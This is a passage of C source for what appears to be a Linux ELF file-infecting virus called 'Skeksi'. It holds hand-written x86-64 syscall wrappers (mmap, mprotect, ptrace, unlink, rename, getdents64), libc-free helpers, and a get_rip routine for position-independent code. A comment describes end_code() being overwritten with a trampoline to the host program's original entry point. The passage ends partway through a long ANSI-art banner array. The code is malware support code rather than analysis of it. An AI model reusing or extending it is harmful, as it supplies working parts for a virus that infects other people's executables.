                        ""syscall"" : : ""g""(fd), ""g""(buf), ""g""(len));
        asm(""mov %%rax, %0"" : ""=r""(ret));
        return ret;
}

int _fstat(long fd, void *buf)
{
        long ret;
        __asm__ volatile(
                        ""mov %0, %%rdi\n""
                        ""mov %1, %%rsi\n""
                        ""mov $5, %%rax\n""
                        ""syscall"" : : ""g""(fd), ""g""(buf));
        asm(""mov %%rax, %0"" : ""=r""(ret));
        return (int)ret;
}

int _unlink(const char *path)
{
	   long ret;
        __asm__ volatile(
                        ""mov %0, %%rdi\n""
			""mov $87, %%rax\n""		
			""syscall"" ::""g""(path));
	asm(""mov %%rax, %0"" : ""=r""(ret));
        return (int)ret;
}

int _rename(const char *old, const char *new)
{
        long ret;
        __asm__ volatile(
                        ""mov %0, %%rdi\n""
                        ""mov %1, %%rsi\n""
                        ""mov $82, %%rax\n""
                        ""syscall"" ::""g""(old),""g""(new));
        asm(""mov %%rax, %0"" : ""=r""(ret));
        return (int)ret;
}

long _lseek(long fd, long offset, unsigned int whence)
{
        long ret;
        __asm__ volatile(
                        ""mov %0, %%rdi\n""
                        ""mov %1, %%rsi\n""
                        ""mov %2, %%rdx\n""
                        ""mov $8, %%rax\n""
                        ""syscall"" : : ""g""(fd), ""g""(offset), ""g""(whence));
        asm(""mov %%rax, %0"" : ""=r""(ret));
        return ret;

}

int _fsync(int fd)
{
        long ret;
        __asm__ volatile(
                        ""mov %0, %%rdi\n""
                        ""mov $74, %%rax\n""
                        ""syscall"" : : ""g""(fd));

        asm (""mov %%rax, %0"" : ""=r""(ret));
        return (int)ret;
}

void *_mmap(void *addr, unsigned long len, unsigned long prot, unsigned long flags, long fd, unsigned long off)
{
        long mmap_fd = fd;
        unsigned long mmap_off = off;
        unsigned long mmap_flags = flags;
        unsigned long ret;

        __asm__ volatile(
                         ""mov %0, %%rdi\n""
                         ""mov %1, %%rsi\n""
                         ""mov %2, %%rdx\n""
                         ""mov %3, %%r10\n""
                         ""mov %4, %%r8\n""
                         ""mov %5, %%r9\n""
                         ""mov $9, %%rax\n""
                         ""syscall\n"" : : ""g""(addr), ""g""(len), ""g""(prot), ""g""(flags), ""g""(mmap_fd), ""g""(mmap_off));
        asm (""mov %%rax, %0"" : ""=r""(ret));              
        return (void *)ret;
}

int _munmap(void *addr, size_t len)
{
        long ret;
        __asm__ volatile(
                        ""mov %0, %%rdi\n""
                        ""mov %1, %%rsi\n""
                        ""mov $11, %%rax\n""
                        ""syscall"" :: ""g""(addr), ""g""(len));
        asm (""mov %%rax, %0"" : ""=r""(ret));
        return (int)ret;
}

int _mprotect(void * addr, unsigned long len, int prot)
{
        unsigned long ret;
        __asm__ volatile(
                        ""mov %0, %%rdi\n""
                        ""mov %1, %%rsi\n""
                        ""mov %2, %%rdx\n""
                        ""mov $10, %%rax\n""
                        ""syscall"" : : ""g""(addr), ""g""(len), ""g""(prot));
        asm(""mov %%rax, %0"" : ""=r""(ret));
        
        return (int)ret;
}

long _ptrace(long request, long pid, void *addr, void *data)
{
        long ret;

        __asm__ volatile(
                        ""mov %0, %%rdi\n""
                        ""mov %1, %%rsi\n""
                        ""mov %2, %%rdx\n""
                        ""mov %3, %%r10\n""
                        ""mov $101, %%rax\n""
                        ""syscall"" : : ""g""(request), ""g""(pid), ""g""(addr), ""g""(data));
        asm(""mov %%rax, %0"" : ""=r""(ret));
        
        return ret;
}

int _prctl(long option, unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5)
{
        long ret;
        
        __asm__ volatile(
                        ""mov %0, %%rdi\n""
                        ""mov %1, %%rsi\n""
                        ""mov %2, %%rdx\n""
                        ""mov %3, %%r10\n""
                        ""mov $157, %%rax\n""
                        ""syscall\n"" :: ""g""(option), ""g""(arg2), ""g""(arg3), ""g""(arg4), ""g""(arg5));
        asm(""mov %%rax, %0"" : ""=r""(ret));
        return (int)ret;
}

int _getdents64(unsigned int fd, struct linux_dirent64 *dirp,
                    unsigned int count)
{
        long ret;
        __asm__ volatile(
                        ""mov %0, %%rdi\n""
                        ""mov %1, %%rsi\n""
                        ""mov %2, %%rdx\n""
                        ""mov $217, %%rax\n""
                        ""syscall"" :: ""g""(fd), ""g""(dirp), ""g""(count));
        asm (""mov %%rax, %0"" : ""=r""(ret));
        return (int)ret;
}

int _gettimeofday(struct timeval *tv, struct timezone *tz)
{
	long ret;
        __asm__ volatile(
                        ""mov %0, %%rdi\n""
                        ""mov %1, %%rsi\n""
                        ""mov $96, %%rax\n""
			""syscall"" :: ""g""(tv), ""g""(tz));
	asm (""mov %%rax, %0"" : ""=r""(ret));
        return (int)ret;

}

void _memcpy(void *dst, void *src, unsigned int len)
{
        int i;
        unsigned char *s = (unsigned char *)src;
        unsigned char *d = (unsigned char *)dst;

        for (i = 0; i < len; i++) {
                *d = *s;
                s++, d++;
        }

}


void Memset(void *mem, unsigned char byte, unsigned int len)
{
        unsigned char *p = (unsigned char *)mem; 
        int i = len;
        while (i--) {
                *p = byte;
                p++;
        }
}

int _printf(char *fmt, ...)
{
        int in_p;
        unsigned long dword;
        unsigned int word;
        char numbuf[26] = {0};
        __builtin_va_list alist;

        in_p;
        __builtin_va_start((alist), (fmt));

        in_p = 0;
        while(*fmt) {
                if (*fmt!='%' && !in_p) {
                        _write(1, fmt, 1);
                        in_p = 0;
                }
                else if (*fmt!='%') {
                        switch(*fmt) {
                                case 's':
                                        dword = (unsigned long) __builtin_va_arg(alist, long);
                                        _puts((char *)dword);
                                        break;
                                case 'u':
                                        word = (unsigned int) __builtin_va_arg(alist, int);
                                        _puts(itoa(word, numbuf));
                                        break;
                                case 'd':
                                        word = (unsigned int) __builtin_va_arg(alist, int);
                                        _puts(itoa(word, numbuf));
                                        break;
                                case 'x':
                                        dword = (unsigned long) __builtin_va_arg(alist, long);
                                        _puts(itox(dword, numbuf));
                                        break;
                                default:
                                        _write(1, fmt, 1);
                                        break;
                        }
                        in_p = 0;
                }
                else {
                        in_p = 1;
                }
                fmt++;
        }
        return 1;
}
char * itoa(long x, char *t)
{
        int i;
        int j;

        i = 0;
        do
        {
                t[i] = (x % 10) + '0';
                x /= 10;
                i++;
        } while (x!=0);

        t[i] = 0;

        for (j=0; j < i / 2; j++) {
                t[j] ^= t[i - j - 1];
                t[i - j - 1] ^= t[j];
                t[j] ^= t[i - j - 1];
        }

        return t;
}
char * itox(long x, char *t)
{
        int i;
        int j;

        i = 0;
        do
        {
                t[i] = (x % 16);

                /* char conversion */
                if (t[i] > 9)
                        t[i] = (t[i] - 10) + 'a';
                else
                        t[i] += '0';

                x /= 16;
                i++;
        } while (x != 0);

        t[i] = 0;

        for (j=0; j < i / 2; j++) {
                t[j] ^= t[i - j - 1];
                t[i - j - 1] ^= t[j];
                t[j] ^= t[i - j - 1];
        }

        return t;
}

int _puts(char *str)
{
        _write(1, str, _strlen(str));
        _fsync(1);

        return 1;
}

int _puts_nl(char *str)
{	
        _write(1, str, _strlen(str));
	_write(1, ""\n"", 1);
	_fsync(1);

        return 1;
}

size_t _strlen(char *s)
{
        size_t sz;

        for (sz=0;s[sz];sz++);
        return sz;
}

	

char _toupper(char c)
{
	if( c >='a' && c <= 'z')
		return (c = c +'A' - 'a');
	return c;
	
}

      
int _strncmp(const char *s1, const char *s2, size_t n)
{
	for ( ; n > 0; s1++, s2++, --n)
		if (*s1 != *s2)
			return ((*(unsigned char *)s1 < *(unsigned char *)s2) ? -1 : +1);
		else if (*s1 == '\0')
			return 0;
	return 0;
}
                                               
int _strcmp(const char *s1, const char *s2)
{
	for ( ; *s1 == *s2; s1++, s2++)
		if (*s1 == '\0')
	    		return 0;
	return ((*(unsigned char *)s1 < *(unsigned char *)s2) ? -1 : +1);
}

int _memcmp(const void *s1, const void *s2, unsigned int n)
{
        unsigned char u1, u2;

        for ( ; n-- ; s1++, s2++) {
                u1 = * (unsigned char *) s1;
                u2 = * (unsigned char *) s2;
        if ( u1 != u2) {
                return (u1-u2);
        }
    }
}





unsigned long get_rip(void)
{
	long ret;
	__asm__ __volatile__ 
	(
	""call get_rip_label	\n""
       	"".globl get_rip_label	\n""
       	""get_rip_label:		\n""
        ""pop %%rax		\n""
	""mov %%rax, %0"" : ""=r""(ret)
	);

	return ret;
}


/*
 * end_code() gets over-written with a trampoline
 * that jumps to the original entry point.
 */
void end_code() 
{
	Exit(0);

}

void dummy_marker()
{
	__ASM__(""nop"");
}


const unsigned char skeksi_banner[] =
""\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30""
""\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30""
""\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40""
""\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x30""
""\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30""
""\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40""
""\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x30""
""\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30""
""\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40""
""\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x30""
""\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30""
""\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40""
""\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x30""
""\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30""
""\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40""
""\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x30""
""\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30""
""\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40""
""\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x6d\x0d\x0a\x1b\x5b""
""\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x40\x38\x38\x38\x38\x38\x38\x38\x38\x38\x38\x38\x38\x38\x38\x38\x38\x38\x38\x38\x38\x38""
""\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30""
""\x3b\x34\x30\x6d\x38\x38\x38\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30""
""\x6d\x58\x1b\x5b\x30\x3b\x33\x32\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31""
""\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x38""
""\x38\x38\x38\x38\x38\x38\x38\x38\x38\x38\x38\x38\x38\x38\x1b\x5b\x30\x6d\x0d\x0a\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d""
""\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x33\x31\x3b""
""\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b""
""\x35\x3b\x33\x30\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d""
""\x58\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x33\x31\x3b""
""\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x30\x3b\x34\x31\x6d\x38\x1b\x5b\x30\x3b""
""\x35\x3b\x33\x32\x3b\x34\x30\x6d\x53\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x31\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d""
""\x58\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x31\x6d\x38\x1b\x5b\x30\x3b\x35""
""\x3b\x33\x33\x3b\x34\x30\x6d\x25\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x37\x6d\x53\x1b\x5b\x30\x3b\x35\x3b\x33\x37\x3b\x34\x30""
""\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x3a\x1b\x5b\x30\x3b\x31\x3b\x33\x37\x3b\x34\x37\x6d\x53\x1b\x5b\x30\x3b""
""\x35\x3b\x33\x33\x3b\x34\x30\x6d\x3b\x74\x2e\x38\x3a\x20\x1b\x5b\x30\x3b\x31\x3b\x33\x37\x3b\x34\x37\x6d\x20\x1b\x5b\x30\x3b\x35""
""\x3b\x33\x33\x3b\x34\x30\x6d\x40\x25\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x35\x3b\x33\x31\x3b\x34""
""\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x33""
""\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b""
""\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34""
""\x30\x6d\x58\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x33""
""\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b""
""\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x6d\x0d\x0a\x1b\x5b\x30\x3b""
""\x31\x3b\x33\x30\x3b\x34\x30\x6d\x40\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x32\x3b\x34\x30""
""\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31""
""\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x32\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b""
""\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33""
""\x33\x3b\x34\x30\x6d\x53\x20\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x37\x6d\x20\x1b\x5b\x30\x3b\x31\x3b\x33\x37\x3b\x34\x37\x6d""
""\x74\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x37\x6d\x2e\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33""
""\x31\x3b\x34\x30\x6d\x25\x1b\x5b\x30\x3b\x35\x3b\x33\x32\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x31\x3b\x33\x37\x3b\x34\x37\x6d\x53""
""\x53\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x37\x6d\x20\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x25\x1b\x5b\x30\x3b\x31""
""\x3b\x33\x37\x3b\x34\x37\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x37\x6d\x20\x1b\x5b\x30\x3b\x31\x3b\x33\x37\x3b\x34\x37""
""\x6d\x3a\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x2e\x1b\x5b\x30\x3b\x31\x3b\x33\x37\x3b\x34\x37\x6d\x20\x1b\x5b\x30\x3b""
""\x35\x3b\x33\x37\x3b\x34\x37\x6d\x58\x1b\x5b\x30\x3b\x31\x3b\x33\x37\x3b\x34\x37\x6d\x2e\x1b\x5b\x30\x3b\x35\x3b\x33\x37\x3b\x34""
""\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x35\x3b\x34\x30\x6d\x25\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x37\x6d\x38\x1b\x5b\x30""
""\x3b\x31\x3b\x33\x37\x3b\x34\x37\x6d\x74\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x3b\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b""
""\x34\x37\x6d\x53\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x38\x40\x58\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x58""
""\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x38\x1b\x5b\x30\x3b\x33\x31""
""\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x32\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30""
""\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x32\x3b\x34\x30""
""\x6d\x38\x1b\x5b\x30\x6d\x0d\x0a\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x40\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d""
""\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x38\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30\x6d\x58\x1b\x5b\x30""
""\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x35\x3b\x34\x30\x6d\x2e\x1b\x5b\x30\x3b\x35\x3b\x33\x37\x3b""
""\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x20\x1b\x5b\x30\x3b\x35\x3b\x33\x37\x3b\x34\x37\x6d\x3b\x1b\x5b""
""\x30\x3b\x31\x3b\x33\x30\x3b\x34\x37\x6d\x20\x1b\x5b\x30\x3b\x35\x3b\x33\x37\x3b\x34\x37\x6d\x25\x1b\x5b\x30\x3b\x35\x3b\x33\x33""
""\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x37\x3b\x34\x37\x6d\x74\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b""
""\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x2e\x1b\x5b\x30\x3b\x31\x3b\x33""
""\x37\x3b\x34\x37\x6d\x3a\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x37\x6d\x53\x1b\x5b\x30\x3b\x35\x3b\x33\x37\x3b\x34\x37\x6d\x58""
""\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x37\x6d\x38\x2e\x74\x1b\x5b\x30\x3b\x31\x3b\x33\x37\x3b\x34\x37\x6d\x2e\x1b\x5b\x30\x3b""
""\x31\x3b\x33\x30\x3b\x34\x37\x6d\x74\x1b\x5b\x30\x3b\x35\x3b\x33\x37\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x31\x3b\x33\x37\x3b\x34""
""\x37\x6d\x58\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x37\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x37\x3b\x34\x30\x6d\x58\x1b\x5b\x30""
""\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x3b\x1b\x5b\x30\x3b\x31\x3b\x33\x37\x3b\x34\x37\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x37\x3b""
""\x34\x37\x6d\x58\x25\x1b\x5b\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x35\x3b\x33\x36\x3b\x34\x30\x6d\x25\x1b""
""\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x37\x6d\x58\x1b\x5b\x30\x3b\x35\x3b\x33\x37\x3b\x34\x37\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33""
""\x30\x3b\x34\x37\x6d\x20\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x74\x3b\x3a\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d""
""\x58\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x38\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31""
""\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x6d\x0d\x0a\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35""
""\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x30\x3b\x34\x31\x6d\x38""
""\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x32""
""\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x35\x3b\x33\x37\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x37\x3b\x34\x37\x6d\x25\x1b""
""\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x20\x53\x1b\x5b\x30\x3b\x31\x3b\x33\x37\x3b\x34\x37\x6d\x25\x20\x1b\x5b\x30\x3b\x35""
""\x3b\x33\x33\x3b\x34\x30\x6d\x20\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x37\x6d\x53\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30""
""\x6d\x53\x1b\x5b\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x53\x1b\x5b\x30\x3b\x35\x3b""
""\x33\x33\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d""
""\x58\x1b\x5b\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35""
""\x3b\x33\x31\x3b\x34\x30\x6d\x38\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34""
""\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x35\x3b\x34\x30\x6d\x20\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x20\x53\x1b\x5b""
""\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30\x6d\x38\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x20\x3a\x1b\x5b\x30\x3b\x31\x3b""
""\x33\x30\x3b\x34\x37\x6d\x53\x40\x38\x25\x1b\x5b\x30\x3b\x31\x3b\x33\x37\x3b\x34\x37\x6d\x25\x1b\x5b\x30\x3b\x35\x3b\x33\x37\x3b""
""\x34\x37\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x25\x1b\x5b\x30\x3b\x31\x3b\x33\x37\x3b\x34\x37\x6d\x3b\x25\x1b""
""\x5b\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b""
""\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b""
""\x35\x3b\x33\x32\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x6d\x0d\x0a\x1b\x5b\x30\x3b\x31\x3b""
""\x33\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x58\x1b""
""\x5b\x30\x3b\x33\x32\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x30\x3b\x34\x31\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30""
